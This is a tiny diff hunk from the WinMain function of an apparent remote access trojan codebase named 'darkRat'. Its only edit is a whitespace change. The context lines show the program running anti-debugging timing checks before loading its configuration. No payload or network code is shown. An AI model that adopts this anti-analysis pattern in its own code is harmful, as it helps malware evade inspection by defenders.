@@ -79,7 +79,7 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 	adbg_RDTSC();
 	adbg_QueryPerformanceCounter();
 	adbg_GetTickCount();
-
+	
 
 	darkRat::config::config config = darkRat::config::load();
 	//Config config;
